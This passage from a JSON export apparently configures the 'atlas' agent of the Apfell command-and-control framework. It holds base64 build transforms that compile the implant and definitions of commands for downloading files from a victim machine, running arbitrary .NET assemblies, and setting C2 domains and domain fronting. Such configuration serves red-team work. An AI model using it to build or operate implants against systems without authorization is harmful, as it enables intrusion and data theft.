          "code": "YXN5bmMgZGVmIGF0bGFzX2xvYWRhc3NlbWJseV9zaG9ydGhhbmQoc2VsZiwgdGFza19wYXJhbXM6c3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICBpbXBvcnQganNvbg0KICAgIGlmIGxlbih0YXNrX3BhcmFtcykgPT0gMDoNCiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJNaXNzaW5nIHBhcmFtZXRlcnMiKQ0KICAgIGlmIHRhc2tfcGFyYW1zWzBdID09ICJ7IjoNCiAgICAgICAgdGFza19kaWN0ID0ganNvbi5sb2Fkcyh0YXNrX3BhcmFtcykNCiAgICAgICAgdGFza19kaWN0WydyZW1vdGVfcGF0aCddID0gJycNCiAgICAgICAgcmV0dXJuIGpzb24uZHVtcHModGFza19kaWN0LCBzb3J0X2tleXM9VHJ1ZSkNCiAgICB0YXNrX2RpY3QgPSB7ImFzc2VtYmx5X2lkIjogdGFza19wYXJhbXMsICJyZW1vdGVfcGF0aCI6ICIifQ0KICAgIHJldHVybiBqc29uLmR1bXBzKHRhc2tfZGljdCk=",
          "name": "atlas_loadassembly_shorthand",
          "parameter_type": "None",
          "description": "Swap out filenames for needed file_id",
          "is_command_code": true,
          "timestamp": "04\/06\/2020 02:33:32",
          "id": 1,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX3J1bmFzc2VtYmx5X3Nob3J0aGFuZChzZWxmLCB0YXNrX3BhcmFtczpzdHIsIHBhcmFtZXRlcjogTm9uZSkgLT4gc3RyOg0KICAgIGltcG9ydCBqc29uDQogICAgaWYgbGVuKHRhc2tfcGFyYW1zKSA9PSAwOg0KICAgICAgICByYWlzZSBFeGNlcHRpb24oIk1pc3NpbmcgcGFyYW1ldGVycyIpDQogICAgaWYgdGFza19wYXJhbXNbMF0gPT0gInsiOg0KICAgICAgICByZXR1cm4gdGFza19wYXJhbXMNCiAgICBwaWVjZXMgPSB0YXNrX3BhcmFtcy5zcGxpdCgiICIpDQogICAgdGFza19kaWN0ID0geyJhc3NlbWJseV9pZCI6IHBpZWNlc1swXSwgImFyZ3MiOiAiICIuam9pbihwaWVjZXNbMTpdKX0NCiAgICByZXR1cm4ganNvbi5kdW1wcyh0YXNrX2RpY3Qp",
          "name": "atlas_runassembly_shorthand",
          "parameter_type": "None",
          "description": "Swap out filename for needed file_id",
          "is_command_code": true,
          "timestamp": "04\/06\/2020 02:33:32",
          "id": 4,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX3N0YW1wX3BhcmFtZXRlcnMoc2VsZiwgcHJpb3Jfb3V0cHV0OiBOb25lLCBwYXJhbWV0ZXI6IHN0cikgLT4gYnl0ZWFycmF5OgogICAgaWYgbGVuKHNlbGYuc2F2ZWRfYXJyYXkpIDwgNjoKICAgICAgICByYWlzZSBFeGNlcHRpb24oIkluY29ycmVjdCBudW1iZXIgb2Ygc2F2ZWQgYXJndW1lbnRzIikKICAgIHV1aWQgPSBvcGVuKCJ7fS9VdWlkLnR4dCIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpLCAncicpLnJlYWQoKQogICAgZmlsZTEgPSBvcGVuKCJ7fS9Db25maWdfdGVtcC5jcyIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpLCAncicpLnJlYWQoKQogICAgZmlsZTIgPSBvcGVuKCJ7fS9Db25maWcuY3MiLmZvcm1hdChzZWxmLndvcmtpbmdfZGlyKSwgJ3cnKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCIlVVVJRCUiLCB1dWlkLnN0cmlwKCkpCiAgICBpZiBzZWxmLnNhdmVkX2FycmF5WzNdIGlzIG5vdCBOb25lIGFuZCBzZWxmLnNhdmVkX2FycmF5WzNdIGlzIG5vdCAiIjoKICAgICAgICBmaWxlMSA9IGZpbGUxLnJlcGxhY2UoJyVQQVJBTSUnLCBzZWxmLnNhdmVkX2FycmF5WzNdKQogICAgZWxzZToKICAgICAgICBmaWxlMSA9IGZpbGUxLnJlcGxhY2UoJyVQQVJBTSUnLCAnaWQnKQogICAgaWYgc2VsZi5zYXZlZF9hcnJheVs0XSBpcyBub3QgTm9uZSBhbmQgc2VsZi5zYXZlZF9hcnJheVs0XSBpcyBub3QgIiI6CiAgICAgICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclQ0hVTktfU0laRSUnLCBzZWxmLnNhdmVkX2FycmF5WzRdKQogICAgZWxzZToKICAgICAgICBmaWxlMSA9IGZpbGUxLnJlcGxhY2UoJyVDSFVOS19TSVpFJScsIHN0cig1MTIwMDApKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclREVGQVVMVF9QUk9YWSUnLCBzZWxmLnNhdmVkX2FycmF5WzVdKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclUFJPWFlfQUREUkVTUyUnLCBzZWxmLnNhdmVkX2FycmF5WzZdKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclUFJPWFlfVVNFUiUnLCBzZWxmLnNhdmVkX2FycmF5WzddKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclUFJPWFlfUEFTU1dPUkQlJywgc2VsZi5zYXZlZF9hcnJheVs4XSkKICAgIGZpbGUyLndyaXRlKGZpbGUxKQogICAgZmlsZTIuY2xvc2UoKQ==",
          "name": "atlas_stamp_parameters",
          "parameter_type": "None",
          "description": "Stamp in parameters for Atlas payload",
          "is_command_code": false,
          "timestamp": "04\/06\/2020 02:33:32",
          "id": 8,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX2NvbXBpbGVfYW5kX3JldHVybihzZWxmLCBwcmlvcl9vdXRwdXQ6IE5vbmUsIHBhcmFtZXRlcjogc3RyKSAtPiBieXRlYXJyYXk6DQogICAgdHJ5Og0KICAgICAgICBpZiBsZW4oc2VsZi5zYXZlZF9hcnJheSkgPCA2Og0KICAgICAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJJbmNvcnJlY3QgbnVtYmVyIG9mIHNhdmVkIGFyZ3VtZW50cyIpDQogICAgICAgIGFyY2ggPSBzZWxmLnNhdmVkX2FycmF5WzFdDQogICAgICAgIHByb2ZpbGUgPSBzZWxmLnNhdmVkX2FycmF5WzJdDQogICAgICAgIGlmIHNlbGYuc2F2ZWRfYXJyYXlbMF0gPT0gIjQuMCI6DQogICAgICAgICAgICBjb21tYW5kID0gIi91c3IvYmluL21jcyAtdGFyZ2V0OndpbmV4ZSAtc2RrOjQgLXBsYXRmb3JtOnt9IC1kZWZpbmU6XCJUUkFDRSx7fVwiIC1vcHRpbWl6ZSsgLW91dDpBdGxhcy5leGUgQ29uZmlnLmNzICBDcnlwdG8uY3MgIEh0dHBfNC4wLmNzIE1vZHVsZXMuY3MgIFByb2dyYW0uY3MgVXRpbHMuY3MiLmZvcm1hdChhcmNoLCBwcm9maWxlKQ0KICAgICAgICBlbGlmIHNlbGYuc2F2ZWRfYXJyYXlbMF0gPT0gIjMuNSI6DQogICAgICAgICAgICBjb21tYW5kID0gIi91c3IvYmluL2dtY3MgL25vY29uZmlnIC9kZWJ1Zy0gL29wdGltaXplKyAvb3V0OkF0bGFzLmV4ZSBDb25maWcuY3MgQ3J5cHRvLmNzIEh0dHBfMy41LmNzIE1vZHVsZXMuY3MgUHJvZ3JhbS5jcyBVdGlscy5jcyAvdGFyZ2V0OndpbmV4ZSAvZGVmaW5lOlRSQUNFLHt9IC9wbGF0Zm9ybTp7fSAvcmVmZXJlbmNlOi91c3IvbGliL21vbm8vMi4wL1N5c3RlbS5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uWG1sLkxpbnEuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLkRhdGEuRGF0YVNldEV4dGVuc2lvbnMuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby9nYWMvTWljcm9zb2Z0LkNTaGFycC80LjAuMC4wX19iMDNmNWY3ZjExZDUwYTNhL01pY3Jvc29mdC5DU2hhcnAuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLkRhdGEuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLlhtbC5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uQ29yZS5kbGwgL3dhcm46NCIuZm9ybWF0KHByb2ZpbGUsIGFyY2gpDQogICAgICAgIHByb2MgPSBhd2FpdCBhc3luY2lvLmNyZWF0ZV9zdWJwcm9jZXNzX3NoZWxsKGNvbW1hbmQsIHN0ZG91dD1hc3luY2lvLnN1YnByb2Nlc3MuUElQRSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGRlcnI9YXN5bmNpby5zdWJwcm9jZXNzLlBJUEUsIGN3ZD1zZWxmLndvcmtpbmdfZGlyKQ0KICAgICAgICBzdGRvdXQsIHN0ZGVyciA9IGF3YWl0IHByb2MuY29tbXVuaWNhdGUoKQ0KICAgICAgICBpZiBzdGRvdXQ6DQogICAgICAgICAgICBwcmludChmJ1tzdGRvdXRdXG57c3Rkb3V0LmRlY29kZSgpfScpDQogICAgICAgIGlmIHN0ZGVycjoNCiAgICAgICAgICAgIHByaW50KGYnW3N0ZGVycl1cbntzdGRlcnIuZGVjb2RlKCl9JykNCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoInt9L0F0bGFzLmV4ZSIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpKToNCiAgICAgICAgICAgIHJldHVybiBieXRlYXJyYXkob3Blbigie30vQXRsYXMuZXhlIi5mb3JtYXQoc2VsZi53b3JraW5nX2RpciksICdyYicpLnJlYWQoKSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgICMgc29tZXRoaW5nIHdlbnQgd3JvbmcsIHJldHVybiBvdXIgZXJyb3JzDQogICAgICAgICAgICByYWlzZSBFeGNlcHRpb24oc3RkZXJyLmRlY29kZSgpKQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKHN0ZGVyci5kZWNvZGUoKSArIHN0ZG91dC5kZWNvZGUoKSk=",
          "name": "atlas_compile_and_return",
          "parameter_type": "None",
          "description": "Compile atlas payload",
          "is_command_code": false,
          "timestamp": "04\/06\/2020 02:33:32",
          "id": 7,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIHNhdmVfc3RyaW5nX3BhcmFtZXRlcihzZWxmLCBwcmlvcl9vdXRwdXQ6IE5vbmUsIHBhcmFtZXRlcjogc3RyKSAtPiBOb25lOgogICAgc2VsZi5zYXZlZF9hcnJheS5hcHBlbmQocGFyYW1ldGVyKQogICAgcmV0dXJuIE5vbmU=",
          "name": "save_string_parameter",
          "parameter_type": "String",
          "description": "Save a string parameter to saved_array",
          "is_command_code": false,
          "timestamp": "04\/06\/2020 02:33:32",
          "id": 6,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIHNhdmVfcGFyYW1ldGVyKHNlbGYsIHByaW9yX291dHB1dDogTm9uZSwgcGFyYW1ldGVyOiBzdHIpIC0+IE5vbmU6CiAgICBzZWxmLnNhdmVkX2FycmF5LmFwcGVuZChwYXJhbWV0ZXIpCiAgICByZXR1cm4gTm9uZQ==",
          "name": "save_parameter",
          "parameter_type": "ChooseOne",
          "description": "Save a value as the next element in self.saved_array",
          "is_command_code": false,
          "timestamp": "04\/06\/2020 02:33:32",
          "id": 5,
          "operator": "apfell_admin"
        }
      ],
      "commands": [
        {
          "needs_admin": false,
          "help_cmd": "upload {\"assembly_id\": 65, \"remote_path\": \"path to file\"}",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Take a file from the database and store it on disk through the callback.",
          "cmd": "upload",
          "parameters": [
            {
              "type": "File",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "assembly_id"
            },
            {
              "type": "String",
              "hint": "Path to save the remote file too (default is current directory)",
              "choices": "",
              "required": true,
              "name": "remote_path"
            }
          ],
          "attack": [
            {
              "t_num": "T1132",
              "attack_name": "Data Encoding"
            },
            {
              "t_num": "T1030",
              "attack_name": "Data Transfer Size Limits"
            },
            {
              "t_num": "T1041",
              "attack_name": "Exfiltration Over Command and Control Channel"
            }
          ],
          "artifacts": [],
          "files": [],
          "transforms": [
            {
              "order": 1,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "04\/06\/2020 02:33:32",
              "command": "upload",
              "command_id": 4,
              "payload_type": "atlas",
              "transform": "atlas_upload_shorthand",
              "parameter_type": "None"
            },
            {
              "order": 2,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "04\/06\/2020 02:33:32",
              "command": "upload",
              "command_id": 4,
              "payload_type": "atlas",
              "transform": "swap_shortnames",
              "parameter_type": "None"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "download [path to remote file]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": true,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Download a file from the victim machine to the apfell server in chunks (no need for quotes in the path). It will be saved to app\/files\/{operation name}\/downloads\/{hostname}\/{filename}",
          "cmd": "download",
          "parameters": [
            {
              "type": "String",
              "hint": "Path to remote file to be downloaded",
              "choices": "",
              "required": true,
              "name": "file_path"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "loadassembly [assembly filename]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Load an arbitrary .NET assembly via Assembly.Load and track the assembly FullName to call for execution with the runassembly command. If assembly is loaded through Apfell's services -> host file, then operators can simply specify the filename from the uploaded file",
          "cmd": "loadassembly",
          "parameters": [
            {
              "type": "File",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "assembly_id"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": [
            {
              "order": 2,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "04\/06\/2020 02:33:32",
              "command": "loadassembly",
              "command_id": 3,
              "payload_type": "atlas",
              "transform": "swap_shortnames",
              "parameter_type": "None"
            },
            {
              "order": 1,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "04\/06\/2020 02:33:32",
              "command": "loadassembly",
              "command_id": 3,
              "payload_type": "atlas",
              "transform": "atlas_loadassembly_shorthand",
              "parameter_type": "None"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "jobkill [job id]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Kills a running job and removes it from the atlas instance's list of running jobs.",
          "cmd": "jobkill",
          "parameters": [
            {
              "type": "String",
              "hint": "The Job Id for the running job to be killed",
              "choices": "",
              "required": true,
              "name": "job_id"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "exit",
          "version": 1,
          "is_exit": true,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This exits the current atlas instance by leveraging the Environment.Exit class method.",
          "cmd": "exit",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "runassembly [filename] [assembly arguments]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Execute the entrypoint of a assembly loaded by the loadassembly command and redirect the console output back to the Apfell server.",
          "cmd": "runassembly",
          "parameters": [
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "assembly_id"
            },
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "args"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": [
            {
              "order": 1,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "04\/06\/2020 02:33:32",
              "command": "runassembly",
              "command_id": 6,
              "payload_type": "atlas",
              "transform": "atlas_runassembly_shorthand",
              "parameter_type": "None"
            },
            {
              "order": 2,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "04\/06\/2020 02:33:32",
              "command": "runassembly",
              "command_id": 6,
              "payload_type": "atlas",
              "transform": "swap_shortnames",
              "parameter_type": "None"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "listloaded",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Retrieve a list of .NET assemblies loaded via the loadassembly command. ",
          "cmd": "listloaded",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "jobs",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Retrieve a list of currently running jobs",
          "cmd": "jobs",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "config [info | domain | sleep | jitter | host_header | user_agent | param | proxy] [add | remove | use_default | address | username | password] [options]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "config\t\t\t\tbase command\noptions:\ninfo\t\t\t\tdisplay current agent configuration\ndomain\t\t\t\toption to add\/remove C2 domain\n\tadd\t\t\t\tadd a C2 domain to list of domains\n\tremove\t\t\tremove a C2 domain from list of domains (will not let list be less then one domain)\nsleep\t\t\t\tsleep time between taskings in seconds\njitter\t\t\t\tvariation in sleep time, specify as a percentage\nkill_date\t\t\tdate for agent to exit itself\nhost_header\t\t\thost header to use for domain fronting\nuser_agent\t\t\tuser-agent header for web requests\nparam\t\t\t\toption for query parameter used in GET requests\nproxy\t\t\t\toption to modify proxy settings\n\tuse_default\t\ttrue\/false, choose whether to use system default settings or manual settings specified in config\n\taddress\t\t\taddress of proxy server\n\tusername\t\tusername to authenticate to proxy server\n\tpassword\t\tpassword to authenticate to proxy server\nExamples:\nconfig info\nconfig domain add http:\/\/hello.world\nconfig sleep 60\nconfig jitter 20\nconfig kill_date 2020-03-01\nconfig host_header cdn.cloudfront.com\nconfig user_agent Mozilla 5.0 IE blah blah blah\nconfig param order\nconfig proxy use_default false\nconfig proxy address 192.168.1.100\nconfig proxy username harm.j0y\nconfig proxy password Liv3F0rTh3Tw!ts",
          "cmd": "config",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "pwd",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Get current working directory of Atlas instance.",
          "cmd": "pwd",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "cd [C:\\path\\to\\cahnge\\to]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Change current working directory of Atlas instance.",
          "cmd": "cd",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "rm [filename]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Delete the specified file.",
          "cmd": "rm",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "ps",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": true,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Gather list of running processes.",
          "cmd": "ps",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": [],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2UpewogIHZhciByb3dzID0gW107CiAgZm9yKHZhciBpID0gMDsgaSA8IHJlc3BvbnNlLmxlbmd0aDsgaSsrKXsKICAgIHRyeXsKICAgICAgICB2YXIgZGF0YSA9IEpTT04ucGFyc2UocmVzcG9uc2VbaV1bJ3Jlc3BvbnNlJ10pOwogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4gcmVzcG9uc2U7CiAgICB9CiAgIHZhciByb3dfc3R5bGUgPSAiIjsKICAgdmFyIGNlbGxfc3R5bGUgPSB7ImhpZGRlbiI6ICJ0ZXh0LWFsaWduOmNlbnRlciIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidHlwZSI6InRleHQtYWxpZ246Y2VudGVyIn07CiAgICAKICAgIGRhdGEuZm9yRWFjaChmdW5jdGlvbihyKXsKICAgICAgdmFyIHJvd19zdHlsZSA9ICIiOwogICAgICByb3dzLnB1c2goeyJwcm9jZXNzX2lkIjogclsncHJvY2Vzc19pZCddLAogICAgICAgICAgICAgICAgICAgICAgICAgICJwYXJlbnRfcHJvY2Vzc19pZCI6IHJbJ3BhcmVudF9wcm9jZXNzX2lkJ10sCiAgICAgICAgICAgICAgICAgICAgICAgICAgInBhdGgiOiByWydiaW5fcGF0aCddLAogICAgICAgICAgICAgICAgICAgICAgICAgICJ1c2VyIjogclsndXNlciddLAogICAgICAgICAgICAgICAgICAgICAgICAgICJyb3ctc3R5bGUiOiByb3dfc3R5bGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICJjZWxsLXN0eWxlIjoge30KICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgfSk7CiAgfQogIHZhciBvdXRwdXQgPSBzdXBwb3J0X3NjcmlwdHNbJ2NyZWF0ZV90YWJsZSddKFt7Im5hbWUiOiJwcm9jZXNzX2lkIiwgInNpemUiOiIxMGVtIn0seyJuYW1lIjoicGFyZW50X3Byb2Nlc3NfaWQiLCAic2l6ZSI6IjEwZW0ifSwgeyJuYW1lIjogInVzZXIiLCAic2l6ZSI6ICIxMGVtIn0seyJuYW1lIjoicGF0aCIsICJzaXplIjoiIn1dLCByb3dzKTsKICByZXR1cm4gb3V0cHV0Owp9"
        },
        {
          "needs_admin": false,
          "help_cmd": "ls [path]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": true,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "List contents of specified directory.",
          "cmd": "ls",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": [],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2UpewogIHZhciByb3dzID0gW107CiAgZm9yKHZhciBpID0gMDsgaSA8IHJlc3BvbnNlLmxlbmd0aDsgaSsrKXsKICAgIHRyeXsKICAgICAgICB2YXIgZGF0YSA9IEpTT04ucGFyc2UocmVzcG9uc2VbaV1bJ3Jlc3BvbnNlJ10pOwogICAgfWNhdGNoKGVycm9yKXsKICAgIAkvL3JldHVybiBlcnJvci5Ub1N0cmluZygpOwogICAgICAgIHJldHVybiByZXNwb25zZTsKICAgIH0KICAgdmFyIHJvd19zdHlsZSA9ICIiOwogICB2YXIgY2VsbF9zdHlsZSA9IHsiaGlkZGVuIjogInRleHQtYWxpZ246Y2VudGVyIiwgInR5cGUiOiJ0ZXh0LWFsaWduOmNlbnRlciJ9OwogICAgCiAgICBkYXRhLmZvckVhY2goZnVuY3Rpb24ocil7CiAgICAgIHZhciByb3dfc3R5bGUgPSAiIjsKICAgICAgaWYgKHJbIklzRGlyIl0pIHsgcm93X3N0eWxlID0gImJhY2tncm91bmQtY29sb3I6ICM1RTI4REMiOyB9CiAgICAgIHJvd3MucHVzaCh7IkZpbGVuYW1lIjogclsnZmlsZV9uYW1lJ10sCiAgICAgICAgICAgICAgICAgICAgICAgICAgIlNpemUiOiByWydzaXplJ10sCiAgICAgICAgICAgICAgICAgICAgICAgICAgIkxhc3Rtb2RpZmllZCI6IHJbJ3RpbWVzdGFtcCddLAogICAgICAgICAgICAgICAgICAgICAgICAgICJJc0RpciI6IHJbJ0lzRGlyJ10sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICJyb3ctc3R5bGUiOiByb3dfc3R5bGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICJjZWxsLXN0eWxlIjoge30KICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgfSk7CiAgfQogdmFyIG91dHB1dCA9IHN1cHBvcnRfc2NyaXB0c1snY3JlYXRlX3RhYmxlJ10oW3sibmFtZSI6IkZpbGVuYW1lIiwgInNpemUiOiIxMGVtIn0seyJuYW1lIjoiU2l6ZSIsICJzaXplIjoiMmVtIn0seyJuYW1lIjoiTGFzdG1vZGlmaWVkIiwic2l6ZSI6IjNlbSJ9ICx7Im5hbWUiOiAiSXNEaXIiLCAic2l6ZSI6ICIyZW0ifV0sIHJvd3MpOwogIHJldHVybiBvdXRwdXQ7Cn0="
        }
      ]
    }
  ]
}
